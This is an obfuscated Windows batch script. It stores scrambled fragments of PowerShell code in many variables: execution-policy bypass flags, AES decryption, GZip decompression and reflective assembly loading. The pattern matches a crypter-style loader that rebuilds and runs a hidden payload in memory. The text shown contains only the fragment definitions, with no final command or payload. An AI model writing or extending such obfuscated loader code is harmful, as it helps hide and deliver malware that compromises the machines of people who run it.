@echo off
set "AjRiSQmWrb=em.I"
set "bJQZobiTZF=dV1k"
set "MEoCUhRKdx= '')"
set "aCBxXhfTrs=tem."
set "eyxzWauXEj='oPV"
set "sHSLPikFBU=P, 0"
set "XiyiYalfaI=YcKX"
set "yadSpKTqkj=2VUN"
set "iUhZVfEmij=1..-"
set "tHSATElBHe=lzzW"
set "zKQHJlrMYA=W = "
set "dsqXVSNKYZ=nage"
set "GwUnoiHVxz=P = "
set "nAASVuGSaw=)) {"
set "GYYcXdQfgb=mxKl"
set "BAZBmxJJcI= [Sy"
set "RcQWtbDova=stem"
set "bXwXmtzaMI=comp"
set "lVwwpNdzFj=; };"
set "aLVNMWcIbA=join"
set "qqWVRQqCfJ=mory"
set "vqurOdWiWz=le  "
set "nNzfDoIhyj=ddin"
set "GVZqQJPLlR== [S"
set "SQgQRxjoDW=.Len"
set "LWQgAfPwqO=rKqX"
set "jbuXupXjAh=]::("
set "cniOtotmuT='')("
set "xZqMAOLrtL=);$S"
set "zpdkNnAeKH=Comp"
set "blMophKPDT=aDNK"
set "ONqtvCanIf=yste"
set "UOXHNBZJiA=ispo"
set "EVMoAYNvzg=and "
set "AiZmDPQOxI=ress"
set "KwmPWtIQcK== $S"
set "gydPGQGWsf=.Ass"
set "QrMQlLocjA===')"
set "GTGfLwdAPT=ek.T"
set "mRMfizrPCb=($Oo"
set "DQTWyWSjxU=ionM"
set "CIoxExsJLC=F'[-"
set "TxwjsFjsGV=p.En"
set "IMLAyykeyh=S46e"
set "KBVRDTyduK=ose("
set "MThEiyuaUr=.Dis"
set "gQUvZCRvkG=  $a"
set "xizoiDstGp=t Sy"
set "HymfGVSdBP=ptor"
set "FcjKAHyudF=]::C"
set "yQNkcetxni= = ["
set "VxFDpuRyBi=);$N"
set "xGuCZabgtf= = $"
set "sffsvVCvfO=brea"
set "xpziPmQCSt= if "
set "YWNXxlOVHR=6esa"
set "cyDfixQPEj=.Mod"
set "tLfwMaWIGc=oint"
set "bYSwsJgGmr=$yAj"
set "YcfnnhHxZd=XT ="
set "sGohwgmEUo=y]::"
set "wlZQgEFzcm=onve"
set "yOkXzfkYCj=tem."
set "XheGIPnncX=Bmor"
set "nECGEHrLjO=[-1."
set "akSsCAduiy=oryS"
set "WnVqgAaSyp=bjec"
set "tGuvuMGGjr=ct S"
set "sOtHpCXFZy=$EoU"
set "YlOzCcZEIG=7kGw"
set "IVSenncqDv=PKCS"
set "gBTEKGQbKq=New-"
set "PNHSmJcFGc=rKqX"
set "DccekfRLVp=-4] "
set "hNtohbFRWc=oArr"
set "ntOEbqpySP=Obje"
set "WoTShCLpHO=y.Pa"
set "FjuzffqdJF=Mode"
set "IxlmuXzHMJ=rity"
set "AspjinkpkF=7;$S"
set "gyiWzKTqOZ= '')"
set "bBvhKiANtL=raph"
set "dTStLMmPXh=LZiA"
set "qojiSzxkbA=;$yA"
set "pULxuNQPCS=;$BN"
set "PkidkxGrut=xKlP"
set "KVdEROmrYB=eam("
set "UNyxFbMIMo=('da"
set "FMddThjnwx=Disp"
set "EQSEmPhSuL=[Sys"
set "lUuAkIEaME=$YcK"
set "DNpmyVoyMF=y.Cr"
set "WvNAfMaBKM=16] "
set "ekFsMKOGxm=Secu"
set "mnlQRGdsEr=).Sp"
set "HRbfsbCZZp=T) {"
set "HLIINYNBRr=xKlP"
set "dmvIyhLzBL=1] -"
set "jlADzAhxjY=.Mem"
set "PFChqKtGMb=[IO."
set "BHyTxhcDjH=ode]"
set "JZHdhioQDh=daeR"
set "hxEqANjeRM=[Sys"
set "VkfGTqVHml=m.IO"
set "wJLhqjrBCD=morF"
set "rNuqfOKoIl=ne);"
set "bYkHhnUUZd=gnir"
set "unpEsdScQX=orF'"
set "ZtVfgbQUjZ=$EoU"
set "kIPBXSrOcn=rt]:"
set "golLvtEMpP=-joi"
set "rcOASbmJUe=Az, "
set "RHhqLEbmYS=ecry"
set "hxcmQqOBqh=('ev"
set "JBPiptDkqX=::De"
set "hxTyHUcGBy=vert"
set "bPuGjZtXID=tem."
set "MQjEjjDDAK=.Con"
set "lEDwLTJilU=zW.D"
set "NpbuLyJNYj=)))"
set "brjFvKrusd='gni"
set "alocPYeALu=pres"
set "JvqeDmbVTu=yste"
set "bLobHokkqt=Obje"
set "vbtJGbunmp=bstr"
set "wRULQyfJnB=();$"
set "NZYQiVrmLj=.Cry"
set "llovkIJpsL=Star"
set "VwgACbHhmo=-ep "
set "vpRadScUzq=..-1"
set "LScQMzjVtA=-1.."
set "QIzxGOdDvT=REt."
set "yGqKVpcdEp=tryP"
set "JMGgXtlzSB=ptog"
set "gxdDVcHYEe=-Obj"
set "FIZAPyDrSg=d;$S"
set "CJdDIBgrFC=gMod"
set "hdgmezXXvb=join"
set "fhgEritWjR=Zhp "
set "heZVtzJRQO=[Sys"
set "nxWRbXDLEV=-nop"
set "qbpUndFbaT=;$LZ"
set "vUidBHQZqu=.Key"
set "nUyMinhMCh==');"
set "WCOPPVqLUv=Disp"
set "fRgXvEeyjN=lit("
set "QewGiKjBXR= = $"
set "nkKjGsEjIC=ewLi"
set "WYLRiYynyb=THxh"
set "WStKnJbUwN=R5jf"
set "CCxUMSLTFQ=ion."
set "udmHnzkskx=:('g"
set "wbPpnIwYRx=Wyqo"
set "LbYwDBUJbF=stem"
set "MHYGyTLiqb=g = "
set "kDDtaomNNI=Syst"
set "ykbgfVhWBj=ew-O"
set "OOtNgnxoTI=New-"
set "CaBnyTmKOS=TllA"
set "NZdIaOvPZu=m.IO"
set "FxlEPLGbLl=.GZi"
set "bcFMdWqCBj=ose("
set "RNJiQqAGcb= New"
set "ovLCcTtSIu=[Env"
set "qqwvhUxbHR=File"
set "pDCfFxQBQA=ach "
set "MnEPZcaLHe=);$y"
set "nAyNVhvOJq=lP);"
set "lyJzOApXil=ring"
set "jtXlFcZENE=Comp"
set "xpUjrRlISc=);$S"
set "amkEbuxgiu=] -j"
set "sihHWisZws=Invo"
set "EODiohmBpB=.Cre"
set "bpowDNiWfJ=rity"
set "gZCwTjiOsU=P = "
set "AUDKqwrVAs=Conv"
set "wQZZvnEPdE=Wfpi"
set "qIYTexGsfy=3); "
set "hLrbuydHCy=SrKq"
set "DAcnXrmvzU=]::("
set "hhBAdtTHcs=();$"
set "hZGvZFkmIB=em.C"
set "VeyxEjzxOz=FcNh"
set "dLcsnWVgtD=k; }"
set "xoaWADaKme=$LZi"
set "QuotsuVSlI=V = "
set "BxCYSIRbOw=bypa"
set "piVqiRzgUq=esaB"
set "EINxkriFWD=kyhK"
set "BaOOKIgDMP=ress"
set "zQyseuUvHL=flec"
set "dUAtaTXWRl=zzM."
set "HALwTRbuHz=ment"
set "FhoAUITDPy=oin "
set "fRTkyKlHQX=null"
set "ecZsfHedoC=ck($"
set "qbPMUjANBd=trea"
set "LNmXoSmreS=iron"
set "kkCOigQtiB=CuSj"
set "sxWEPxkOEG=8kuY"
set "nWYGoRLuFm=zm83"
set "hgpsSoEAUW=mxKl"
set "hCjKQZJkbr=ert]"
set "oTLHhdOIKv=:: '"
set "DmUeGzGvjb=sion"
set "kQpdXLQzCL=m.Re"
set "OIpZPcvEXb=pher"
set "WWfLPxZpHF=Oozz"
set "fFcHosrpnm=ptog"
set "VxDefXakJh=ect "
set "XtnMKVfwPI=, (,"
set "yAfllzSAtP=();$"
set "SfjeIdaeLD=n ''"
set "nvjugtZrCH=saBm"
set "zJejPbmlZQ=ct S"
set "TqjArSXYZj=embl"
set "lephrIQXPB=form"
set "kjkDCcLIKf=n ''"
set "ujaPxoYZbK=BREt"
set "LdTIcjPFoe=am;$"
set "ofUckyYuFr=.-16"
set "UhPMLZENmw=nirt"
set "VNlqSmNWtI=$EoU"
set "LZbjmOkoLH=in $"
set "sYgroizhyB=..-1"
set "odeUdWQSEf=($Oo"
set "vCdKfLrNet=$mxK"
set "jqhBylJNpP=Syst"
set "EIIVgCqpca=raph"
set "GLZEnypFzm=grap"
set "vTWACbfkJv= = N"
set "ubDNWYSzpO=pose"
set "SRpmKLWXrM=)($m"
set "cCyqLXxahs=.Cry"
set "ecUJGwraNk=lBlo"
